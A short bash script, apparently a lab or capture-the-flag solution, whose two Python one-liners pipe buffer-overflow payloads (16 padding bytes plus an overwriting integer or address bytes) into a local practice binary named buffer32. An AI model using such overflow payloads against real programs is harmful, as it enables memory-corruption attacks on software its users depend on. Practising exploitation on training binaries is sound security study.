#!/usr/bin/env bash

python -c "import struct; print 'A' * 16 + struct.pack('<I', 1000000)" | ./buffer32

python -c "print 'A' * 16 + '\x60\xe3\x16\x000'" | ./buffer32
